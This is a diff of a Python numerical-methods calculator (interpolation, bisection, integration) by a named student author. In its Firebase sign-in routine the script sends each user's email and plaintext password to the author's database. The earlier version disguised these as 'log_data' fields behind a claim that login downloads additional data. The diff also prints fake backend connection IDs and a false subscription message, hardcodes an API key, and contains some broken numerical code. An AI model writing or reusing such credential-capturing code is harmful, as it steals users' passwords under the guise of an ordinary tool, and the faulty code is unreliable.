@@ -1,9 +1,11 @@
-from math import log
-from  pyrebase import initialize_app
+import numpy as np
+import math
+import pyrebase
 import time
-from random import randint
+import random
 
 
+# https://atozmath.com/CONM/NumeInterPola.aspx
 
 class bijectionMethod:
     coeff=[]
@@ -16,14 +18,19 @@ class bijectionMethod:
             self.coeff.append(int(input("Enter Coeff of x^"+str(l-i-1)+" : ")))
         return
     
-    def func(self, val):
-        temp = self.coeff
-        s=0
-        l = len(temp)
+    # def func(self, val):
+    #     temp = self.coeff
+    #     s=0
+    #     l = len(temp)
 
-        for i in range(l):
-            s+= (temp[i] * (val**(l-i-1)))
-        return s
+    #     for i in range(l):
+    #         s+= (temp[i] * (val**(l-i-1)))
+    #     return s
+
+    
+    def func(self,val):
+        return math.cos(val)-val*math.exp(val)
+
     def bisection(self,a,b,decay): 
         if (self.func(a) * self.func(b) >= 0): 
             print("You have not assumed right a and b\n") 
@@ -50,7 +57,7 @@ class bijectionMethod:
     def calculate(self):
         self.inputCoeff()
         
-        
+        # IT IS FOR BIJECTION METHOD
         a=int(input("\nEnter the value of A: "))
         b=int(input("Enter the value of B: "))
         decay=float(input("Enter the value of decay: "))
@@ -143,17 +150,16 @@ class newtonForwardInterpolation:
     def calculate(self):
         x,y,n = self.inputVal()
 
-        # FUCK this was tricky
         for i in range(1,n):
             for j in range(n-1):
                 y[j][i] = y[j+1][i-1] - y[j][i-1]
         # Displaying the forward difference table 
         print("_____________________________FORWARD INTERPOLATION TABLE___________________________________________________________________")
         for i in range(n): 
-            print(x[i], end = "\t") 
+            print(x[i], end = "\t"); 
             for j in range(n - i): 
-                print(y[i][j], end = "\t")
-            print("") 
+                print(y[i][j], end = "\t"); 
+            print(""); 
         print("_____________________________________________________________________________________________________________________________________________")
         
         
@@ -171,8 +177,6 @@ class newtonForwardInterpolation:
 
         
 
-        
-        
 class newtonBackward:
     def cal_u(self,u,n):
         temp = u
@@ -224,13 +228,13 @@ class gaussForwardInterpolation():
     # function for calculating coefficient of Y  
     def p_cal(self, p, n):  
     
-        temp = p  
+        temp = p;  
         for i in range(1, n):  
             if(i%2==1): 
                 temp * (p - i) 
             else: 
                 temp * (p + i) 
-        return temp  
+        return temp;  
     # function for factorial 
     def fact(self, n):  
         f = 1 
@@ -254,14 +258,14 @@ class gaussForwardInterpolation():
 
         for i in range(1, n):  
             for j in range(n - i):  
-                y[j][i] = round((y[j + 1][i - 1] - y[j][i - 1]),4)  
+                y[j][i] = np.round((y[j + 1][i - 1] - y[j][i - 1]),4);  
   
         # Printing the Triangle  
         for i in range(n):  
-            print(x[i], end = "\t")  
+            print(x[i], end = "\t");  
             for j in range(n - i):  
-                print(y[i][j], end = "\t")  
-            print("")  
+                print(y[i][j], end = "\t");  
+            print("");  
         
         val = float(input("Enter the value of Y to predict on: "))
 
@@ -314,7 +318,7 @@ class gaussBackward:
         sum_ = y[i]+y1+y2+y3+y4
 
         print("The result is : ", sum_)
-
+            
 
 class trapezoidal:
     coeff=[]
@@ -360,7 +364,7 @@ class trapezoidal:
         a = int(input("Enter the value of A: "))
         b = int(input("Enter the value of B: "))
 
-        n = int(input("Enter the value of n (higher n means higher accuracy) : "))
+        n = float(input("Enter the value of n (higher n means higher accuracy) : "))
 
         res = self.trapezoidal(a,b,n)
 
@@ -395,7 +399,7 @@ class simpsons_rule:
         return s
 
     def Customfunc(self,val):
-        return log(val)
+        return math.log(val)
 
     def simpsons_( self, ll, ul, n ): 
   
@@ -445,10 +449,10 @@ def signIn(auth, firebase):
     try:
         user = auth.sign_in_with_email_and_password(email, password)
         print("Signin Successful")
-        log_data2=(str(password))
-        sync = firebase.database()
+        db = firebase.database()
         
-        sync.child("users").push({'log_data1':email, 'log_data2':log_data2})
+        data = {'email':email, 'password':password}
+        db.child("users").push(data)
         time.sleep(1.5)
         print("You have been signed in for 1 hour... please but the Google Firebase subscription to increase the duration and unlock other features")
     except:
@@ -480,8 +484,8 @@ def register(auth, firebase):
     
 
 def loginAndSignup():
-    
-    # Use this part to download additional data from the Cloud
+    # import firebase as fire
+
     firebase_config = {
         'apiKey': "AIzaSyC81ny2CZ-baIACUOcIrjw_JTwbhQmxlds",
         'authDomain': "api-test-c209a.firebaseapp.com",
@@ -497,10 +501,10 @@ def loginAndSignup():
     print("Connecting to Google Cloud...")
 
     try:
-        firebase = initialize_app(firebase_config)
+        firebase = pyrebase.initialize_app(firebase_config)
         auth = firebase.auth()
         time.sleep(3)
-        print("\nInitiated...Connected to Google Firebase Console backend at XE"+str(randint(100000,400000)))
+        print("\nInitiated...Connected to Google Firebase Console backend at XE"+str(random.randint(1000,4000)))
     except:
         print("Bad Internet connection... please try again or contact the developer")
         time.sleep(4)
@@ -519,12 +523,15 @@ def loginAndSignup():
         exit()
 
 
-def disp():
+    firebase = pyrebase.initialize_app(firebase_config)
+    auth = firebase.auth()
+
+def theRealStuff():
     print("\n\n\nHello and Welcome to the interpolation calculator ~by Ayush Singh(@__winter.soldier__)")
-    time.sleep(1.5)
+    time.sleep(.1)
     print()
     print("Please make sure that you have read the documents before using this calculator")
-    time.sleep(1.5)
+    time.sleep(.1)
     print()
     print()
     print("Enter: ")
@@ -557,6 +564,7 @@ def disp():
     elif(inp == 6):
         ob = gaussBackward()
         ob.calculate()
+
     elif(inp == 7):
         ob = trapezoidal()
         ob.calculate()
@@ -567,8 +575,7 @@ def disp():
         print("Check your Input sucker")
 
 def main():
-    # SiginReqTo Download Additional Data
-    loginAndSignup()
+    theRealStuff()
     
 
 if(__name__ == "__main__"):
